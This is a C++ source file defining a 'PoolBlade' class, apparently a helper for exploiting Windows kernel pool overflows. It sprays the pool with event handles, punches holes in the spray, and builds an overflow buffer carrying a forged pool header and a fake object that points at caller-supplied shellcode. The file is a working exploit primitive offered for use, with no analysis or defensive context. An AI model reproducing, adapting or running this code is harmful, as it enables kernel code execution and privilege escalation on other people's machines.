#include "PoolBlade.h"


PoolBlade::PoolBlade()
{
	fake = NULL;
	buffer = NULL;
	pShellcode = NULL;
	hArr = NULL;
	dwPoolSize = 0;
}

PoolBlade::PoolBlade(VOID * shellcode, DWORD size)
{
	PoolBlade();
	pShellcode = shellcode;
	dwPoolSize = size;
}

VOID PoolBlade::Fill()
{
	for(int i = 0 ; i < 0x100000 ; i++)
		CreateEvent(NULL, FALSE, FALSE, NULL);	
}
BYTE * PoolBlade::AutoExploitInit(DWORD *size)
{
	if(pShellcode == NULL || dwPoolSize == 0)
		return NULL;
	
	Fill();

	int i;
	hArr = new HANDLE[0x10000];
	for(i = 0 ; i < 0x10000 ; i++)
		hArr[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
		
	for(i = 0 ; i < 0xf000 ; i+=0x200)
		for(int j = 0; j < (dwPoolSize / 0x30)+1; j++)
			CloseHandle(hArr[i+j]);

	*size = dwPoolSize + 0x16;
	buffer = new BYTE[*size];
	memset(buffer, 0x41, dwPoolSize);	
	
	
	*(WORD*)(buffer+dwPoolSize) = ((dwPoolSize+8)/8) & 0x1ff;	
	buffer[dwPoolSize+2] = 0x06;
	buffer[dwPoolSize+3] = 0x0A;
 	*(DWORD*)(buffer+dwPoolSize+4) = 0xee657645;
	*(DWORD*)(buffer+dwPoolSize+8) = 0xdeadfa11;
	*(DWORD*)(buffer+dwPoolSize+0xC) = 0xcafebabe;

	fake = new BYTE[0x190];
	memset(fake, 0, 0x190);
	*(DWORD*)(fake+0xA8) = (DWORD)pShellcode;		

	*(DWORD*)(buffer+dwPoolSize+0x10) = (DWORD)fake;
	*(WORD*)(buffer+dwPoolSize+0x14) = NULL;	
	return buffer;
}

VOID PoolBlade::ExploitFinish()
{
	
	for(int i = 0 ; i < 0x10000 ; i++)	
		CloseHandle(hArr[i]);
	
	if (fake != NULL)
		delete fake;
	if ( buffer != NULL)
		delete buffer;
	if(hArr != NULL)
		delete hArr;
}
